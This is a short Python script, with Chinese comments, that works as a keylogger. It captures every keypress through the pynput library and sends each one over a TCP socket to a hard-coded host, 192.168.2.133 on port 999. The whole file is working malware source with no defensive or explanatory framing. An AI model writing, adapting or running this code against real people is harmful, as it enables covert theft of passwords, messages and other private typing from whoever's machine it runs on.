import socket
from pynput import keyboard

def on_press(key):#按下键盘，将接受到的key发送給服务端
    print(f"{key}")
    data=f'{key}'
    tcpCliSock.send(bytes(data,'utf-8'))#将监听信息转换为比特，并发送到服务端


host='192.168.2.133'
port=999
addr=(host,port)
tcpCliSock=socket.socket()
tcpCliSock.connect(addr)

with keyboard.Listener(on_press=on_press) as lis:#开始实时监听
    lis.join()

